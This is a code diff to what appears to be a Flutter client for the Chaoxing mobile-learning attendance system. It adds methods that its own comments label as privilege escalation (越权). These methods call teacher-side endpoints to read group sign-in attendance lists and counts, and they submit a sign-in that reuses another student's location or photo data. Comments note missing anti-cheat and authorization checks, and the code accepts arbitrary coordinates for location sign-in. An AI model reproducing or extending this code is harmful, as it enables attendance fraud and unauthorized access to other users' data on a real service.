@@ -263,6 +263,7 @@ class SignInApi{
   }
 
   /// 获取参与详细
+  /// 仅签到活动可用
   static Future<Map<String, dynamic>?> getAttendInfoWeb(String activeId) async {
     try {
       final url = 'https://mobilelearn.chaoxing.com/v2/apis/sign/getAttendInfo?activeId=$activeId&moreClassAttendEnc=';
@@ -281,17 +282,32 @@ class SignInApi{
   // 存在权鉴
 
   /// 群聊签到
-  /// 群聊签到没有验证码 没有签到码
+  /// 群聊签到没有签到码、防作弊
   /// 且相对于课程签到漏洞较多 没有严格权鉴
-  static Future<String?> groupSign(String activeId, User user) async {
+  // 手势 二维码不需要验证
+  static Future<String?> groupSign(String activeId, User user,
+      {String? objectId, String? address, double? latitude, double? longitude}) async {
     try {
       final url = 'https://mobilelearn.chaoxing.com/sign/stuSignajax';
       final params = {
         'activeId': activeId,
         'uid': user.uid,
-        'clientip': '10.0.85.108', // 幽默之使用内网IP
-        'useragent': HeadersManager.chaoxingHeaders['user-agent'] as String
+        'clientip': '', // 10.0.85.*
+        // 'useragent': HeadersManager.chaoxingHeaders['user-agent'] as String
       };
+
+      if (objectId != null) {
+        params['objectId'] = objectId;
+      } else if (address != null) {
+        final locationParams = {
+          'address': address,
+          'latitude': latitude!.toStringAsFixed(6),
+          'longitude': longitude!.toStringAsFixed(6),
+          'fid': '',
+          'ifTiJiao': '1'
+        };
+        params.addAll(locationParams);
+      }
 
       final cookieStr = await _getUserCookie(user.uid) ?? '';
       final headers = {'Cookie': cookieStr};
@@ -313,6 +329,88 @@ class SignInApi{
       return response.data;
     } catch (e) {
       debugPrint('getSignReceipt error: $e');
+    }
+    return null;
+  }
+
+  /// 获取群聊签到详细
+  static Future<Map<String, dynamic>?> getGroupSignDetail(String activeId) async {
+    try {
+      final url = 'https://mobilelearn.chaoxing.com/sign/getSignDetail?id=$activeId';
+
+      final response = await ApiService.sendRequest(url);
+      return response.data;
+    } catch (e) {
+      debugPrint('getGroupSignDetail error: $e');
+    }
+    return null;
+  }
+
+  /// 获取群聊签到列表（越权）
+  static Future<Map<String, dynamic>?> getGroupAttendList(String activeId) async {
+    try {
+    final url = 'https://mobilelearn.chaoxing.com/widget/sign/group/pcTeaSignGroupController/getAttendList?activeId=$activeId';
+
+      final response = await ApiService.sendRequest(url);
+      if (response.data['result'] == 1){
+        return response.data['data'];
+      }
+    } catch (e) {
+      debugPrint('getGroupAttendList error: $e');
+    }
+    return null;
+  }
+
+  /// 使用指定用户数据进行群聊签到（越权）
+  static Future<String?> groupSignWithUserData(String activeId, User currentUser, 
+      Map<String, dynamic> targetUserData) async {
+    try {
+      final url = 'https://mobilelearn.chaoxing.com/sign/stuSignajax';
+      final params = <String, String>{
+        'activeId': activeId,
+        'uid': currentUser.uid,
+        'clientip': '',
+        'name': targetUserData['name'] ?? currentUser.name,
+        'fid': targetUserData['activeFid']?.toString() ?? '',
+      };
+
+      // 如果是位置签到
+      if (targetUserData['title'] != null && targetUserData['title'].toString().isNotEmpty && targetUserData['longitude'] != null && targetUserData['latitude'] != null) {
+        params.addAll({
+          'address': targetUserData['title'].toString(),
+          'latitude': targetUserData['latitude'].toString(),
+          'longitude': targetUserData['longitude'].toString(),
+          'ifTiJiao': '1'
+        });
+      }
+
+      // 如果是拍照签到
+      if (targetUserData['title'] != null && targetUserData['title'].toString().isNotEmpty) {
+        params['objectId'] = targetUserData['title'].toString();
+      }
+
+      final cookieStr = await _getUserCookie(currentUser.uid) ?? '';
+      final headers = {'Cookie': cookieStr};
+
+      final response = await ApiService.sendRequest(url, params: params, headers: headers, responseType: ResponseType.plain);
+      return response.data;
+    } catch (e) {
+      debugPrint('groupSignWithUserData error: $e');
+    }
+    return null;
+  }
+
+  /// 获取群聊签到人数（越权）
+  static Future<Map<String, dynamic>?> getGroupAttendCount(String activeId) async {
+    try {
+      final url = 'https://mobilelearn.chaoxing.com/widget/sign/group/pcTeaSignGroupController/getCount?activeId=$activeId';
+
+      final response = await ApiService.sendRequest(url);
+      if (response.data['result'] == 1){
+        return response.data['data'];
+      }
+    } catch (e) {
+      debugPrint('getGroupAttendCount error: $e');
     }
     return null;
   }
